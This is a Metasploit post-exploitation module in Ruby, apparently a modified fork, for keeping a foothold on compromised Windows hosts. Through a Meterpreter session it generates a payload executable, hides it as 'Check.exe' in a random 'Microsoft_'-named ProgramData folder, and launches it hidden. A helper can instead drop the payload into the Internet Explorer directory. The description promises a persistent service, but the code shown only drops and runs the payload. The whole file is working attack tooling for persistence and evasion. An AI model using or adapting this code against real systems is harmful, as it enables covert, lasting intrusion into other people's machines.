##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'metasploit/framework/compiler/windows'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
                      'Name'           => 'Windows Persistent Service Installer Simple API',
                      'Description'    => %q{
        This Module will generate and upload an executable to a remote host, next will make it a persistent service.
        It will create a new service which will start the payload whenever the service is running. Admin or system
        privilege is required.
      },
                      'License'        => MSF_LICENSE,
                      'Author'         => ['Green-m <greenm.xxoo[at]gmail.com>'],
                      'Platform'       => ['windows'],
                      'Arch'           => [ARCH_X86, ARCH_X64],
                      'Targets'        => [['Windows', {}]],
                      'SessionTypes'   => ['meterpreter'],
                      'DefaultTarget'  => 0,
                      'References'     => [
                              ['URL', 'https://github.com/rapid7/metasploit-framework/blob/master/external/source/metsvc/src/metsvc.cpp']
                      ],
                      'DisclosureDate' => "Jul 10 2019"
          ))

    register_options(
            [
            ])
  end

  # Run Method for when run command is issued
  #-------------------------------------------------------------------------------
  def exploit

    unless session.type == "meterpreter"
      pub_json_result(false,
                      'Unsupport shell type',
                      nil,
                      self.uuid)
      return
    end

    vprint_status("Running module against #{sysinfo['Computer']}")

    @storedir = create_store_rand_dir()
    if @storedir == nil
      pub_json_result(false,
                      'Create rand dir failed',
                      nil,
                      self.uuid)
      return
    end

    exe      = generate_payload_exe
    exe_path = @storedir + "\\" + "Check.exe"
    write_file_to_target(exe_path, exe)
    unless session.fs.file.exist? exe_path
      pub_json_result(false,
                      'write loader to storedir failed,maybe permission or AV',
                      nil,
                      self.uuid)
      return
    end

    # Set variables

    begin
      vprint_status("Running as guard")
      session.sys.process.execute("#{exe_path} g", nil, { 'Hidden' => true })
      data = { :path => exe_path }
      pub_json_result(true,
                      nil,
                      data,
                      self.uuid)
    rescue ::Exception => e
      vprint_error("Failed to Running as guard.")
      vprint_error(e.to_s)
      print_error_redis(e.to_s)
      pub_json_result(false,
                      "Failed to run as guard.",
                      nil,
                      self.uuid)
    end
  end



  def write_exe_to_target(rexe, rexename, rexepath)
    # check if we have write permission
    if rexepath
      begin
        temprexe = rexepath + "\\" + rexename
        write_file_to_target(temprexe, rexe)
      rescue Rex::Post::Meterpreter::RequestError
        vprint_warning("Insufficient privileges to write in #{rexepath}, writing to %APPDATA%")
        temprexe = session.sys.config.getenv('ProgramFiles') + "\\Internet Explorer\\" + rexename
        write_file_to_target(temprexe, rexe)
      end
    else
      temprexe = session.sys.config.getenv('ProgramFiles') + "\\Internet Explorer\\" + rexename
      write_file_to_target(temprexe, rexe)
    end

    vprint_good("Meterpreter service exe written to #{temprexe}")

    temprexe
  end

  def write_file_to_target(temprexe, rexe)
    fd = session.fs.file.new(temprexe, "wb")
    fd.write(rexe)
    fd.close
  end

  def create_store_rand_dir()
    dirname     = Rex::Text.rand_text_alpha(6)
    fulldirname = session.sys.config.getenv('ProgramData') + "\\" + "Microsoft_#{dirname}"
    session.fs.dir.mkdir(fulldirname)
    if session.fs.file.exist? fulldirname
      vprint_good("create storedir : #{fulldirname}")
      return fulldirname
    else
      vprint_error("create storedir failed : #{fulldirname}")
      return nil
    end
  end
end
